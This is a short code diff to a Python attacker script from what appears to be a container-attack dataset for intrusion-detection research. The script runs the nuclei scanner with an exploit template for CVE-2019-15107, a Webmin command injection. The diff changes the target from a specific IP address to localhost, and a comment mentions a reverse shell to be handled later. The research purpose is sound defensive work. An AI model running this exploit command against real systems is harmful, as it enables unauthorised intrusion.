@@ -19,7 +19,7 @@ class OSCI_CVE_2019_15107_Attacker1(AttackerBase):
     def main(self):
         print("Main method started")
         #self.commandRunner.runCommand('echo "nuclei script started" ')     
-        self.commandRunner.runCommand('nuclei -u https://144.122.71.18:30003 -t /home/vagrant/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/Scenario-I/OSCI_CVE_2019_15107/Attacker1/CVE-2019-15107.yaml -debug ')
+        self.commandRunner.runCommand('nuclei -u https://localhost:30003 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2019-15107.yaml')
 
 
     # Reverse shell will be handle later...
@@ -65,7 +65,6 @@ if __name__ == '__main__':
 # MAIN YAML PATH: ~/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-15107_Payload.yaml
 # MAIN YAML AUTHOR: HALE
 # MAIN YAML SOURCE: https://github.com/jas502n/CVE-2019-15107
-
 
 
 
